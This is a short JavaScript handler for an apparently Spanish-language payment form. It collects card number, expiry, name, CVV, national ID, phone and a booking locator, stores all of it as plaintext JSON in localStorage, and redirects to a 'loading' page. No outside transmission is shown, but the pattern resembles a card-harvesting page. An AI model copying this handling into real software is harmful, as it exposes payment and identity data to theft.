  document.addEventListener('DOMContentLoaded', () => {
    const pagarBtn = document.querySelector('.card-form-submit');

    pagarBtn.addEventListener('click', (e) => {
      e.preventDefault();

      const cardNumber = document.getElementById('card-number').value.trim();
      const month = document.getElementById('month-select').value;
      const year = document.getElementById('year-select').value;
      const name = document.querySelector('input[placeholder="Tal como aparece en la tarjeta"]').value.trim();
      const cvv = document.getElementById('cvv').value.trim();
      const cuotas = document.getElementById('cuotas-select').value;
      const cedula = document.getElementById('cc').value.trim();
      const telefono = document.getElementById('tel').value.trim();

      // Validación simple
      if (!cardNumber || month === 'Mes' || year === 'Año' || !name || !cvv || !cuotas || !cedula || !telefono) {
        alert('Por favor completa todos los campos del formulario.');
        return;
      }

      // Guardar en localStorage
      localStorage.setItem('pago', JSON.stringify({
        cardNumber,
        month,
        year,
        name,
        cvv,
        cuotas,
        cedula,
        telefono,
        locator: document.getElementById('locator-code')?.textContent || ''
      }));

      // Redirigir
      window.location.href = 'loading';
    });
  });